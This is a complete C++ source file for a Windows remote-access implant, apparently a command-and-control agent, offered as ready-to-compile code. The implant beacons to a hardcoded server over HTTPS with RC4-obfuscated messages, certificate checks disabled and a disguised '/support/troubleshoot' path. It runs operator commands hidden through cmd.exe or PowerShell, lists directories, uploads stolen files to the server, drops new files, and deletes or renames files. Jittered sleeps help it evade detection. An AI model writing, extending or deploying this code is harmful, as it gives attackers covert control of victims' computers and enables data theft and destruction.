// x86_64-w64-mingw32-g++ -o HTTPS_RC4.exe HTTPS_RC4.cpp -lwininet -lcrypt32 -lws2_32 -static -std=c++17 -lstdc++fs

#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <random>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <ctime>
#include <algorithm>
#include <cstring>
#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <shlwapi.h>
#include <filesystem>
#include <iomanip>
#include <sstream>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shlwapi.lib")

using namespace std;

string AUTH_ID = "33e859a2-64db-4a83-992e-68af67ba27c5";
string SERVER_HOST = "192.168.1.107";
int SERVER_PORT = 111;
string RC4_KEY = "22";
string DEFAULT_USER_AGENT = "Mozilla/5.0";
bool VERIFY_SSL = false;


class RC4 {
private:
    string key;
    
    vector<int> ksa(const string& key) {
        int key_length = key.length();
        vector<int> S(256);
        for (int i = 0; i < 256; i++) S[i] = i;
        
        int j = 0;
        for (int i = 0; i < 256; i++) {
            j = (j + S[i] + (unsigned char)key[i % key_length]) % 256;
            swap(S[i], S[j]);
        }
        return S;
    }
    
    vector<unsigned char> prga(vector<int>& S, size_t data_length) {
        int i = 0, j = 0;
        vector<unsigned char> keystream;
        keystream.reserve(data_length);
        
        for (size_t k = 0; k < data_length; k++) {
            i = (i + 1) % 256;
            j = (j + S[i]) % 256;
            swap(S[i], S[j]);
            keystream.push_back((unsigned char)S[(S[i] + S[j]) % 256]);
        }
        return keystream;
    }

    string crypt_to_string(const string& data) {
        vector<unsigned char> data_bytes(data.begin(), data.end());
        vector<int> S = ksa(key);
        vector<unsigned char> keystream = prga(S, data_bytes.size());
        
        vector<unsigned char> result(data_bytes.size());
        for (size_t i = 0; i < data_bytes.size(); i++) {
            result[i] = data_bytes[i] ^ keystream[i];
        }
        return string(result.begin(), result.end());
    }

public:
    RC4(const string& key_str) : key(key_str) {}
    
    string encrypt(const string& data) {
        return crypt_to_string(data);
    }
    
    string decrypt(const string& data) {
        return crypt_to_string(data);
    }
    

    string encrypt_to_hex(const string& data) {
        string encrypted = crypt_to_string(data);
        return bytes_to_hex(encrypted);
    }
    
    string decrypt_from_hex(const string& hex_data) {
        string bytes = hex_to_bytes(hex_data);
        return crypt_to_string(bytes);
    }
    
private:
    string bytes_to_hex(const string& bytes) {
        stringstream ss;
        ss << hex << setfill('0');
        for (unsigned char c : bytes) {
            ss << setw(2) << (int)c;
        }
        return ss.str();
    }
    
    string hex_to_bytes(const string& hex) {
        string bytes;
        for (size_t i = 0; i < hex.length(); i += 2) {
            string byte_str = hex.substr(i, 2);
            char byte = (char)strtol(byte_str.c_str(), NULL, 16);
            bytes.push_back(byte);
        }
        return bytes;
    }
};



class Json {
private:
    enum Type { JSON_NULL, JSON_OBJECT, JSON_ARRAY, JSON_STRING, JSON_BOOL, JSON_NUMBER };
    Type type;
    map<string, Json> object_value;
    vector<Json> array_value;
    string string_value;
    bool bool_value;
    double number_value;

public:
    Json() : type(JSON_NULL), bool_value(false), number_value(0) {}
    Json(nullptr_t) : type(JSON_NULL), bool_value(false), number_value(0) {}
    Json(const string& s) : type(JSON_STRING), string_value(s), bool_value(false), number_value(0) {}
    Json(const char* s) : type(JSON_STRING), string_value(s), bool_value(false), number_value(0) {}
    Json(bool b) : type(JSON_BOOL), bool_value(b), number_value(0) {}
    Json(int n) : type(JSON_NUMBER), number_value(n), bool_value(false) {}
    Json(double n) : type(JSON_NUMBER), number_value(n), bool_value(false) {}
    Json(const map<string, Json>& obj) : type(JSON_OBJECT), object_value(obj), bool_value(false), number_value(0) {}

    static Json object() { Json j; j.type = JSON_OBJECT; return j; }
    static Json array() { Json j; j.type = JSON_ARRAY; return j; }

    Json& operator[](const string& key) {
        if (type != JSON_OBJECT) { type = JSON_OBJECT; object_value.clear(); }
        return object_value[key];
    }

    Json& operator[](size_t index) {
        if (type != JSON_ARRAY) { type = JSON_ARRAY; array_value.clear(); }
        if (index >= array_value.size()) array_value.resize(index + 1);
        return array_value[index];
    }

    void push_back(const Json& val) {
        if (type != JSON_ARRAY) { type = JSON_ARRAY; array_value.clear(); }
        array_value.push_back(val);
    }

    string dump(int indent = 0) const {
        if (type == JSON_NULL) return "null";
        if (type == JSON_BOOL) return bool_value ? "true" : "false";
        if (type == JSON_STRING) return "\"" + escape(string_value) + "\"";
        if (type == JSON_NUMBER) {
            char buf[64];
            if (number_value == (int)number_value) snprintf(buf, sizeof(buf), "%d", (int)number_value);
            else snprintf(buf, sizeof(buf), "%g", number_value);
            return string(buf);
        }
        if (type == JSON_ARRAY) {
            string result = "[";
            for (size_t i = 0; i < array_value.size(); i++) {
                if (i > 0) result += ",";
                if (indent >= 0) result += "\n" + string(indent + 2, ' ');
                result += array_value[i].dump(indent >= 0 ? indent + 2 : -1);
            }
            if (indent >= 0 && !array_value.empty()) result += "\n" + string(indent, ' ');
            result += "]";
            return result;
        }
        if (type == JSON_OBJECT) {
            string result = "{";
            bool first = true;
            for (const auto& pair : object_value) {
                if (!first) result += ",";
                first = false;
                if (indent >= 0) result += "\n" + string(indent + 2, ' ');
                result += "\"" + escape(pair.first) + "\":" + (indent >= 0 ? " " : "");
                result += pair.second.dump(indent >= 0 ? indent + 2 : -1);
            }
            if (indent >= 0 && !object_value.empty()) result += "\n" + string(indent, ' ');
            result += "}";
            return result;
        }
        return "null";
    }

private:
    static string escape(const string& s) {
        string result;
        for (char c : s) {
            if (c == '"') result += "\\\"";
            else if (c == '\\') result += "\\\\";
            else if (c == '\b') result += "\\b";
            else if (c == '\f') result += "\\f";
            else if (c == '\n') result += "\\n";
            else if (c == '\r') result += "\\r";
            else if (c == '\t') result += "\\t";
            else if (c < 0x20) { char buf[8]; snprintf(buf, sizeof(buf), "\\u%04x", c); result += buf; }
            else result += c;
        }
        return result;
    }
};

string base64_encode(const string& input) {
    if (input.empty()) return "";
    DWORD encodedSize = 0;
    CryptBinaryToStringA((const BYTE*)input.c_str(), (DWORD)input.length(),
                         CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encodedSize);
    if (encodedSize == 0) return "";
    vector<char> encoded(encodedSize);
    if (!CryptBinaryToStringA((const BYTE*)input.c_str(), (DWORD)input.length(),
                              CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encoded.data(), &encodedSize)) {
        return "";
    }
    return string(encoded.data());
}

string base64_decode(const string& input) {
    if (input.empty()) return "";
    DWORD decodedSize = 0;
    CryptStringToBinaryA(input.c_str(), (DWORD)input.length(), CRYPT_STRING_BASE64,
                         NULL, &decodedSize, NULL, NULL);
    if (decodedSize == 0) return "";
    vector<BYTE> decoded(decodedSize);
    if (!CryptStringToBinaryA(input.c_str(), (DWORD)input.length(), CRYPT_STRING_BASE64,
                              decoded.data(), &decodedSize, NULL, NULL)) {
        return "";
    }
    return string((char*)decoded.data(), decodedSize);
}

RC4* rc4 = nullptr;

string session_id;
vector<string> uris = {"/support/troubleshoot"};
string current_user_agent = DEFAULT_USER_AGENT;
double sleep_time = 60.0;
int start_jitter = 0;
int end_jitter = 0;
string prepend_output = "";
string append_output = "";
map<string, string> get_client_headers;
map<string, string> post_client_headers;

string random_choice(const vector<string>& vec) {
    if (vec.empty()) return "";
    static random_device rd;
    static mt19937 gen(rd());
    uniform_int_distribution<> dis(0, (int)vec.size() - 1);
    return vec[dis(gen)];
}

string get_url() {
    return "https://" + SERVER_HOST + ":" + to_string(SERVER_PORT) + random_choice(uris);
}

map<string, string> get_request_headers(bool is_post) {
    map<string, string> headers;
    headers["User-Agent"] = current_user_agent;
    if (is_post) {
        headers["Content-Type"] = "application/json";
        for (const auto& h : post_client_headers)
            if (!h.second.empty()) headers[h.first] = h.second;
    } else {
        for (const auto& h : get_client_headers)
            if (!h.second.empty()) headers[h.first] = h.second;
    }
    return headers;
}

string http_request(const string& url, const string& method, const string& data, const map<string, string>& headers) {
    string host = SERVER_HOST;
    int port = SERVER_PORT;
    string path = "/support/troubleshoot";

    size_t https_pos = url.find("https://");
    if (https_pos != string::npos) {
        string temp = url.substr(https_pos + 8);
        size_t slash_pos = temp.find('/');
        if (slash_pos != string::npos) {
            string host_part = temp.substr(0, slash_pos);
            size_t colon_pos = host_part.find(':');
            if (colon_pos != string::npos) {
                host = host_part.substr(0, colon_pos);
                port = stoi(host_part.substr(colon_pos + 1));
            } else {
                host = host_part;
                port = 443;
            }
            path = temp.substr(slash_pos);
        }
    }

    HINTERNET hInternet = InternetOpenA(current_user_agent.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return "";
    }

    HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }

    DWORD flags = INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                  INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
                  INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS |
                  INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
                  INTERNET_FLAG_NO_CACHE_WRITE |
                  INTERNET_FLAG_SECURE;

    if (!VERIFY_SSL) {
        flags |= INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                 INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(), path.c_str(), NULL, NULL, NULL, flags, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    if (!VERIFY_SSL) {
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                        SECURITY_FLAG_IGNORE_WRONG_USAGE;
        InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

    string headers_str;
    for (const auto& h : headers)
        headers_str += h.first + ": " + h.second + "\r\n";
    if (method == "POST")
        headers_str += "Content-Length: " + to_string(data.length()) + "\r\n";
    headers_str += "\r\n";

    if (!HttpSendRequestA(hRequest, headers_str.c_str(), (DWORD)headers_str.length(),
                          (LPVOID)(method == "POST" ? data.c_str() : NULL),
                          method == "POST" ? (DWORD)data.length() : 0)) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusCodeSize, NULL);

    string response;
    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        response += buffer;
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return response;
}

string get_json_value(const string& json, const string& key) {
    string search = "\"" + key + "\":\"";
    size_t pos = json.find(search);
    if (pos == string::npos) {
        search = "\"" + key + "\":";
        pos = json.find(search);
        if (pos == string::npos) return "";
        pos += search.length();
        while (pos < json.length() && isspace((unsigned char)json[pos])) pos++;
        if (pos >= json.length()) return "";
        if (json[pos] == '"') {
            pos++;
            size_t end = json.find('"', pos);
            if (end == string::npos) return "";
            return json.substr(pos, end - pos);
        }
        size_t end = json.find_first_of(",}", pos);
        if (end == string::npos) end = json.length();
        return json.substr(pos, end - pos);
    }
    pos += search.length();
    size_t end = json.find('"', pos);
    if (end == string::npos) return "";
    return json.substr(pos, end - pos);
}

vector<string> get_json_array(const string& json, const string& key) {
    vector<string> result;
    string search = "\"" + key + "\":[";
    size_t pos = json.find(search);
    if (pos == string::npos) return result;
    pos += search.length();
    size_t end = json.find(']', pos);
    if (end == string::npos) return result;

    string arr = json.substr(pos, end - pos);
    size_t start = 0;
    while ((start = arr.find('\"', start)) != string::npos) {
        start++;
        size_t end_quote = arr.find('\"', start);
        if (end_quote == string::npos) break;
        result.push_back(arr.substr(start, end_quote - start));
        start = end_quote + 1;
    }
    return result;
}

string json_escape(const string& s) {
    string out;
    out.reserve(s.size() + 16);
    for (unsigned char c : s) {
        switch (c) {
            case '\"': out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\b': out += "\\b";  break;
            case '\f': out += "\\f";  break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (c < 0x20) {
                    char buf[8];
                    snprintf(buf, sizeof(buf), "\\u%04x", c);
                    out += buf;
                } else {
                    out += c;
                }
        }
    }
    return out;
}

void apply_jitter() {
    if (start_jitter > end_jitter) swap(start_jitter, end_jitter);
    static random_device rd;
    static mt19937 gen(rd());
    uniform_int_distribution<> dis(start_jitter, end_jitter);
    int jitter_amount = dis(gen);
    double final_sleep = sleep_time + jitter_amount;
    final_sleep = max(10.0, min(900.0, final_sleep));
    this_thread::sleep_for(chrono::milliseconds((int)(final_sleep * 1000)));
}

void parse_headers(const string& raw_value, map<string, string>& target) {
    if (raw_value.empty()) return;
    
    stringstream ss(raw_value);
    string line;
    
    while (getline(ss, line, '\n')) {
        line.erase(0, line.find_first_not_of(" \t\r\n"));
        line.erase(line.find_last_not_of(" \t\r\n") + 1);
        
        if (line.empty()) continue;
        
        size_t colon_pos = line.find(':');
        if (colon_pos != string::npos) {
            string key = line.substr(0, colon_pos);
            string value = line.substr(colon_pos + 1);
            
            key.erase(0, key.find_first_not_of(" \t\r\n"));
            key.erase(key.find_last_not_of(" \t\r\n") + 1);
            value.erase(0, value.find_first_not_of(" \t\r\n"));
            value.erase(value.find_last_not_of(" \t\r\n") + 1);
            
            if (key == "q" || key.empty() || value.empty()) {
                continue;
            }
            
            if (key == "Host") {
                continue;
            }
            
            target[key] = value;
        }
    }
}

bool checkin() {
    try {

        string encrypted_id = rc4->encrypt_to_hex(AUTH_ID);

        string payload = "{\"action\":\"checkin\",\"token\":\"" + json_escape(encrypted_id) + "\"}";

        string response = http_request(get_url(), "POST", payload, get_request_headers(true));
        if (response.empty()) {
            return false;
        }

        if (response.find("\"sid\"") == string::npos) {
            return false;
        }

        string sid_enc = get_json_value(response, "sid");
        if (sid_enc.empty()) {
            return false;
        }


        session_id = rc4->decrypt_from_hex(sid_enc);
        if (session_id.empty() || session_id.find("HTTPS - RC4 - ") == string::npos) {
            return false;
        }

        string ua_enc = get_json_value(response, "ua");
        if (!ua_enc.empty()) {
            string ua = rc4->decrypt_from_hex(ua_enc);
            if (!ua.empty()) current_user_agent = ua;
        }

        string sj_enc = get_json_value(response, "sj");
        if (!sj_enc.empty()) {
            string sj = rc4->decrypt_from_hex(sj_enc);
            if (!sj.empty()) start_jitter = stoi(sj);
        }

        string ej_enc = get_json_value(response, "ej");
        if (!ej_enc.empty()) {
            string ej = rc4->decrypt_from_hex(ej_enc);
            if (!ej.empty()) end_jitter = stoi(ej);
        }

        string sl_enc = get_json_value(response, "sl");
        if (!sl_enc.empty()) {
            string sl = rc4->decrypt_from_hex(sl_enc);
            if (!sl.empty()) sleep_time = stod(sl);
        }

        vector<string> uris_enc = get_json_array(response, "ur");
        if (!uris_enc.empty()) {
            vector<string> new_uris;
            for (const auto& u : uris_enc) {
                string dec = rc4->decrypt_from_hex(u);
                if (!dec.empty()) new_uris.push_back(dec);
            }
            if (!new_uris.empty()) uris = new_uris;
        }

        string pre_enc = get_json_value(response, "pre");
        if (!pre_enc.empty()) prepend_output = rc4->decrypt_from_hex(pre_enc);

        string app_enc = get_json_value(response, "app");
        if (!app_enc.empty()) append_output = rc4->decrypt_from_hex(app_enc);

        string gh_enc = get_json_value(response, "gh");
        if (!gh_enc.empty()) {
            string gh = rc4->decrypt_from_hex(gh_enc);
            if (!gh.empty()) {
                get_client_headers.clear();
                parse_headers(gh, get_client_headers);
            }
        }

        string ph_enc = get_json_value(response, "ph");
        if (!ph_enc.empty()) {
            string ph = rc4->decrypt_from_hex(ph_enc);
            if (!ph.empty()) {
                post_client_headers.clear();
                parse_headers(ph, post_client_headers);
            }
        }

        return true;
    }
    catch (exception& e) {
        return false;
    }
}

string get_tasks() {
    if (session_id.empty()) {
        return "";
    }

    try {
        string encrypted_sid = rc4->encrypt_to_hex(session_id);
        string payload = "{\"action\":\"get_tasks\",\"sid\":\"" + json_escape(encrypted_sid) + "\"}";

        string response = http_request(get_url(), "POST", payload, get_request_headers(true));
        if (response.empty()) {
            return "";
        }

        string cmd_enc = get_json_value(response, "command");
        if (cmd_enc.empty()) {
            return "";
        }

        string cmd = rc4->decrypt_from_hex(cmd_enc);
        return cmd;
    }
    catch (exception& e) {
        return "";
    }
}

void submit_output(const string& output) {
    if (session_id.empty()) {
        return;
    }

    try {
        string encrypted = rc4->encrypt_to_hex(output);
        string final_output = prepend_output + encrypted + append_output;

        string sid_enc = rc4->encrypt_to_hex(session_id);

        string payload = "{\"action\":\"submit\",\"sid\":\"" + json_escape(sid_enc) +
                         "\",\"out\":\"" + json_escape(final_output) + "\"}";

        http_request(get_url(), "POST", payload, get_request_headers(true));
    }
    catch (exception& e) {
    }
}



string run_cmd_command(const string& cmd) {
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr, hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) return "[-] Failed to create pipe";
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    string full_cmd = "cmd.exe /c " + cmd;
    vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE,
                                  CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        DWORD error = GetLastError();
        CloseHandle(hStdoutRd);
        return "[-] CMD execution error: " + to_string(error);
    }

    string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    DWORD exitCode = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    string output = result;
    size_t start = output.find_first_not_of(" \t\r\n");
    if (start != string::npos) {
        size_t end = output.find_last_not_of(" \t\r\n");
        output = output.substr(start, end - start + 1);
    }
    if (exitCode != 0) output += "\n[Exit Code: " + to_string(exitCode) + "]";
    return output.empty() ? "[+] Command executed (no output)" : output;
}

string run_powershell_command(const string& ps_cmd) {
    string escaped_cmd;
    for (char c : ps_cmd) {
        if (c == '"') escaped_cmd += "\\\"";
        else escaped_cmd += c;
    }

    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr, hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) return "[-] Failed to create pipe";
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    string full_cmd = "powershell.exe -NoProfile -NonInteractive -Command " + escaped_cmd;
    vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE,
                                  CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        DWORD error = GetLastError();
        CloseHandle(hStdoutRd);
        return "[-] PowerShell execution error: " + to_string(error);
    }

    string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    DWORD exitCode = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    string output = result;
    size_t start = output.find_first_not_of(" \t\r\n");
    if (start != string::npos) {
        size_t end = output.find_last_not_of(" \t\r\n");
        output = output.substr(start, end - start + 1);
    }
    if (exitCode != 0) output += "\n[Exit Code: " + to_string(exitCode) + "]";
    return output.empty() ? "[+] PowerShell command executed (no output)" : output;
}

Json browse_directory(const string& path) {
    Json result = Json::object();
    try {
        string actual_path = path;
        if (actual_path.find('~') == 0) {
            char* home = getenv("USERPROFILE");
            if (home) {
                actual_path = string(home) + actual_path.substr(1);
            }
        }

        if (!std::filesystem::exists(actual_path)) {
            result["success"] = false;
            result["error"] = "Path does not exist: " + actual_path;
            result["current_path"] = actual_path;
            result["parent_path"] = nullptr;
            result["items"] = Json::array();
            return result;
        }

        Json items = Json::array();
        for (const auto& entry : std::filesystem::directory_iterator(actual_path)) {
            try {
                Json item = Json::object();
                item["name"] = entry.path().filename().string();
                item["type"] = entry.is_directory() ? "directory" : "file";
                item["size"] = entry.is_directory() ? 0 : (double)entry.file_size();
                
                auto ftime = entry.last_write_time();
                auto time_t = std::chrono::system_clock::to_time_t(
                    std::chrono::time_point_cast<std::chrono::system_clock::duration>(
                        ftime - std::filesystem::file_time_type::clock::now() + 
                        std::chrono::system_clock::now()
                    )
                );
                stringstream ss;
                ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
                item["modified_time"] = ss.str();
                
                items.push_back(item);
            } catch (const std::exception&) {
                continue;
            }
        }

        result["success"] = true;
        result["current_path"] = actual_path;
        
        std::filesystem::path parent = std::filesystem::path(actual_path).parent_path();
        if (actual_path.size() >= 2 && actual_path[1] == ':' && actual_path.size() == 3 && actual_path[2] == '\\') {
            result["parent_path"] = nullptr;
        } else if (parent.empty()) {
            result["parent_path"] = nullptr;
        } else {
            result["parent_path"] = parent.string();
        }
        result["items"] = items;
    } catch (const std::exception& e) {
        result["success"] = false;
        result["error"] = e.what();
        result["current_path"] = path;
        result["parent_path"] = nullptr;
        result["items"] = Json::array();
    }
    return result;
}

string download_file(const string& filepath) {
    try {
        if (!std::filesystem::exists(filepath)) {
            return "ERROR: File not found: " + filepath;
        }
        
        if (std::filesystem::is_directory(filepath)) {
            return "ERROR: Cannot download directory: " + filepath;
        }
        
        ifstream file(filepath, ios::binary);
        if (!file) {
            return "ERROR: Cannot open file: " + filepath;
        }
        
        vector<unsigned char> file_data((istreambuf_iterator<char>(file)), 
                                        istreambuf_iterator<char>());
        file.close();
        
        string filename = std::filesystem::path(filepath).filename().string();
        size_t filesize = file_data.size();
        string encoded = base64_encode(string((char*)file_data.data(), file_data.size()));
        
        return "file-data:" + filename + "|" + to_string(filesize) + "|" + encoded;
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string upload_file(const string& filepath, const string& filedata_b64) {
    try {
        string decoded_data = base64_decode(filedata_b64);
        vector<unsigned char> file_data(decoded_data.begin(), decoded_data.end());
        
        std::filesystem::path path_obj(filepath);
        std::filesystem::create_directories(path_obj.parent_path());
        
        ofstream file(filepath, ios::binary);
        if (!file) {
            return "ERROR: Cannot write file: " + filepath;
        }
        file.write(reinterpret_cast<const char*>(file_data.data()), file_data.size());
        file.close();
        
        return "SUCCESS: File uploaded to " + filepath;
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string delete_file(const string& filepath) {
    try {
        if (!std::filesystem::exists(filepath)) {
            return "ERROR: Path does not exist: " + filepath;
        }
        
        if (std::filesystem::is_directory(filepath)) {
            std::filesystem::remove_all(filepath);
            return "SUCCESS: Deleted directory " + filepath;
        } else {
            std::filesystem::remove(filepath);
            return "SUCCESS: Deleted file " + filepath;
        }
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string rename_file(const string& old_path, const string& new_path) {
    try {
        if (!std::filesystem::exists(old_path)) {
            return "ERROR: Source path does not exist: " + old_path;
        }
        
        std::filesystem::rename(old_path, new_path);
        return "SUCCESS: Renamed to " + new_path;
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string execute_command(const string& cmd) {
    string trimmed = cmd;
    size_t start = trimmed.find_first_not_of(" \t\r\n");
    if (start != string::npos) {
        size_t end = trimmed.find_last_not_of(" \t\r\n");
        trimmed = trimmed.substr(start, end - start + 1);
    }
    if (trimmed.empty()) return "[no command]";

    if (trimmed.find("browse:") == 0) {
        string browse_path = trimmed.substr(7);
        while (!browse_path.empty() && browse_path.front() == ' ') browse_path.erase(0, 1);
        if (browse_path.empty()) {
            browse_path = std::filesystem::current_path().string();
        }
        Json dir_data = browse_directory(browse_path);
        string json_str = dir_data.dump();
        string base64_data = base64_encode(json_str);
        return "browse-data-" + base64_data;
    }

    if (trimmed.find("download-file:") == 0) {
        string filepath = trimmed.substr(14);
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        return download_file(filepath);
    }

    if (trimmed.find("upload-file:") == 0) {
        string rest = trimmed.substr(12);
        size_t sep_pos = rest.find('|');
        if (sep_pos != string::npos) {
            string filepath = rest.substr(0, sep_pos);
            string filedata_b64 = rest.substr(sep_pos + 1);
            return upload_file(filepath, filedata_b64);
        } else {
            return "ERROR: Invalid upload format. Use: upload-file:path|base64_data";
        }
    }

    if (trimmed.find("delete-file:") == 0) {
        string filepath = trimmed.substr(12);
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        return delete_file(filepath);
    }

    if (trimmed.find("rename-file:") == 0) {
        string rest = trimmed.substr(12);
        size_t sep_pos = rest.find('|');
        if (sep_pos != string::npos) {
            string old_path = rest.substr(0, sep_pos);
            string new_path = rest.substr(sep_pos + 1);
            return rename_file(old_path, new_path);
        } else {
            return "ERROR: Invalid rename format. Use: rename-file:old_path|new_path";
        }
    }

    if (trimmed.find("ping") == 0) {
        return "pong";
    }

    string upper_cmd = trimmed;
    transform(upper_cmd.begin(), upper_cmd.end(), upper_cmd.begin(), ::toupper);

    if (upper_cmd.length() >= 3 && upper_cmd.substr(0, 3) == "EP ") {
        string ps_cmd = trimmed.substr(3);
        size_t s = ps_cmd.find_first_not_of(" \t\r\n");
        if (s != string::npos) ps_cmd = ps_cmd.substr(s);
        return run_powershell_command(ps_cmd);
    }
    if (upper_cmd.length() >= 2 && upper_cmd.substr(0, 2) == "EP") {
        string ps_cmd = trimmed.substr(2);
        size_t s = ps_cmd.find_first_not_of(" \t\r\n");
        if (s != string::npos) ps_cmd = ps_cmd.substr(s);
        return run_powershell_command(ps_cmd);
    }
    return run_cmd_command(trimmed);
}

void main_loop() {
    rc4 = new RC4(RC4_KEY);

    while (session_id.empty()) {
        if (checkin()) {
            break;
        }
        int wait_time = rand() % 40000 + 20000;
        this_thread::sleep_for(chrono::milliseconds(wait_time));
    }

    while (true) {
        try {
            string cmd = get_tasks();
            if (!cmd.empty()) {
                string result = execute_command(cmd);
                submit_output(result);
            }
            apply_jitter();
        }
        catch (exception& e) {
            int wait_time = rand() % 90000 + 30000;
            this_thread::sleep_for(chrono::milliseconds(wait_time));
        }
    }
}

int main() {
    srand(static_cast<unsigned>(time(nullptr)));

    HINTERNET hInternet = InternetOpenA(DEFAULT_USER_AGENT.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return 1;
    }
    InternetCloseHandle(hInternet);

    main_loop();
    return 0;
}
